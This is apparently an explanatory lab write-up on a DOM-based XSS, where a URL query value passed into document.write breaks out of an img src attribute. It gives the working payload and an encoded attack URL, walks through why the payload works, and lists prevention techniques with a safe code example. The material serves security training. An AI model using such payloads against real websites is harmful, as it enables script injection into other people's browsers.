# DOM-Based XSS in `document.write` Sink via `location.search` Source  
**Lab Scenario**: DOM XSS where user input from `location.search` (URL query string) is directly passed into `document.write()` without sanitization, and the output is rendered in an `<img>` tag's `src` attribute.

---

## Vulnerability Details

| Component | Value |
|--------|-------|
| **Source** | `location.search` (e.g., `?search=hello`) |
| **Sink** | `document.write()` |
| **Context** | Inside HTML attribute (`src="..."`) of an `<img>` tag |
| **XSS Type** | **DOM-based** (client-side, no server reflection) |

---

## Your Working Payload

```html
"><img src=x onerror=alert(20)>
```

**Full URL Example**:
```
https://vulnerable-lab.com/?search=%22%3E%3Cimg%20src%3Dx%20onerror%3Dalert(20)%3E
```

> URL-encoded version of your payload:
> - `"` → `%22`
> - `>` → `%3E`
> - `<` → `%3C`
> - Space → `%20`

---

## Step-by-Step Breakdown: Why It Worked

Let’s assume the vulnerable JavaScript code looks like this:

```js
const params = new URLSearchParams(location.search);
const query = params.get('search') || 'default';
document.write('<img src="/images/' + query + '.jpg">');
```

### Step 1: Input Injection
You set:
```
?search="><img src=x onerror=alert(20)>
```

After `URLSearchParams`, `query = "\"><img src=x onerror=alert(20)>"`

---

### Step 2: `document.write()` Output

The code writes:

```js
document.write('<img src="/images/' + "\"><img src=x onerror=alert(20)>" + '.jpg">');
```

Which becomes:

```html
<img src="/images/"><img src=x onerror=alert(20)>.jpg">
```

---

### Step 3: HTML Parsing & Breakout

The browser parses this malformed HTML:

```html
<img src="/images/">          <!-- Closes the original img tag early -->
<img src=x onerror=alert(20)> <!-- New injectable img tag -->
.jpg">                        <!-- Junk text, ignored in rendering -->
```

#### Key Observations:
- `"><` → closes the `src` attribute (`"`) and the original `<img>` tag (`>`)
- Now you're **outside** the original tag → free to inject new HTML
- `<img src=x ...>` → creates a new image
- `src=x` → invalid image URL → triggers `onerror`
- `onerror=alert(20)` → executes JavaScript when image fails to load

---

## Why `src=x` + `onerror`?

| Technique | Purpose |
|---------|--------|
| `src=x` | Intentionally broken image URL (no protocol, no valid path) |
| `onerror` | Event fired when image fails to load |
| `alert(20)` | Proof-of-concept to show code execution |

> This is a **classic DOM XSS pattern** in attribute context.

---

## Notes & Key Concepts

### 1. **Context Matters**
- You were in **HTML attribute context** (`src="..."`)
- To break out, you must close:
  - The attribute → `"`
  - The tag → `>`
- Hence: `"><` is the **breakout sequence**

### 2. **Why Not Just `<script>alert(20)</script>`?**
- `document.write()` in attribute context → `<script>` tags may be escaped or not executable
- Also, modern browsers block `<script>` in `document.write()` after page load in some cases
- `<img onerror=...>` is **more reliable** in attribute breakout

### 3. **DOM XSS vs Reflected/Strored**
| Type | Source | Execution |
|------|--------|----------|
| DOM XSS | Client-side JS | Browser parses & executes |
| Reflected | Server response | Server echoes input |
| Stored | Database | Saved & served later |

This is **pure DOM XSS** — no server involvement.

---

## Prevention Techniques

| Method | Description |
|-------|-----------|
| **Avoid `document.write()`** | Use DOM methods: `createElement`, `textContent` |
| **Sanitize input** | Strip `<`, `>`, `"`, etc. |
| **Escape properly** | Use `encodeURIComponent()` or HTML entity encoding |
| **Content Security Policy (CSP)** | Block inline scripts: `script-src 'self'` |

**Safe Example**:
```js
const img = document.createElement('img');
img.src = '/images/' + encodeURIComponent(query).replace(/[^a-z0-9]/gi, '') + '.jpg';
document.body.appendChild(img);
```

---

## Summary: Why Your Payload Was Perfect

| Feature | Your Payload | Why It Worked |
|-------|--------------|---------------|
| `"><` | Closes `src` and original `<img>` | Escapes context |
| `<img src=x` | Starts new tag with broken image | Triggers error |
| `onerror=alert(20)` | Executes JS on failure | Reliable XSS trigger |
| No reliance on server | Pure client-side | True DOM XSS |

---

**Final Note**: This is a **textbook DOM XSS in attribute context**. Your intuition to:
1. Identify the sink (`document.write`)
2. Detect the context (`src` attribute)
3. Use breakout + `onerror`  
→ was **spot-on**.

**Pro Tip**: Always ask:
> *"What context am I in? How do I break out and inject executable code?"*

You nailed it. Keep hunting! 🛡️